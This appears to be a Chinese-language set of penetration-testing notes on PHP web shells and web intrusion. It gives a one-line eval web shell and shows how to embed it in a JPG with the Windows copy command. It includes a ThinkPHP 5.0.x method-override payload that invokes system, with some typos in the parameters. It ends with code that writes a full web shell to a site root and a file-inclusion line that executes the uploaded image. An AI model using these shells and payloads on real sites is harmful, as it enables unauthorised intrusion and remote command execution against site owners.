> 相关站点参考：
>
> <https://null-byte.wonderhowto.com/how-to/top-80-websites-available-tor-network-0186117/>









### 相关工具制作以及利用

#### 图片木马&一句木马

参考：<https://www.guhei.net/post/jb2536>

PHP 环境：

```shell
# cat test.php
<?php
eval($_GET["shell"]);
?>
## 访问打印phpinfo
http://IP/test.php?shell=phpinfo();
其中shell可以是任意字符串，用于传入php语句
http://IP/test.php?shell=echo(__DIR__);
输出当前脚本所在的目录
## 原理： ##
php 中的 eval 函数将接收一个字符串参数，并将这个字符串作为命令语句执行，上面的是 get 请求，post 请求也大同小异。
```

一句话图片木马制作

1）windows cpoy 功能

```shell
copy 1.jpg/b + test.php/a 2.jpg
用16进制软件打开2.jpg可以看到里面的test.php代码
```



图片木马利用：

前提：需要有文件包含漏洞，可以是 php 代码漏洞，也可以是 nginx/php-fpm 漏洞/配置文件漏洞。即本地文件包含漏洞及解析漏洞。





## 渗透中 PoC、Exp、Payload 与 Shellcode 的区别

PoC，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。

Exp，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。

Payload，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。

Shellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。

通俗理解：

想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧







## 入侵实例1

参考：<https://zhuanlan.zhihu.com/p/59071838>

1）找后台



2）识别CMS

挖掘漏洞：

​	黑盒审计

​	白盒审计

发现：ThinkPHP Fastadmin

3）ThinkPHP版本漏洞

查看版本：

```shell
# find ./thinkphp -name "*.php" |xargs grep -i version
./base.php:define('THINK_VERSION', '5.0.22');
```

在thinkphp5.0.x版本中，文件/thinkphp/library/think/Request.php包含了处理请求的Request类，在Method方法中，表单伪装变量对该方法的变量进行覆盖，可以实现对该类的所有函数进行调用。

在Request类中，我们看一下__construct析构方法。如果该类属性不存在，就会调用默认配置文件中的default_filter的值。如果该类属性存在，就会对$option数组进行遍历，将该类属性赋值为$option数组中键对应的值

因此，我们可以构造一个Payload：s=ipconfig&_mehthod=__construct$method=&filter[]=system







### PHP代码的三种写法

```shell
1. <? phpinfo(); ?>
2. <?php phpinfo(); ?>
3. <script language="php"> phpinfo(); </script>
```





### 文件包含getshell

上传图片格式大马：

```shell
<?php$test='大马代码';//访问这个文件大马的代码将被写入网站的根目录2.php下 （路径phpinfo得到）file_put_contents("/home/www/webdata/epage/2.php", $test);
```

include文件包含：

`<script language="php">include '../ezfiles/2/1002/img/92/123.jpg';//上传的图片地址</script>`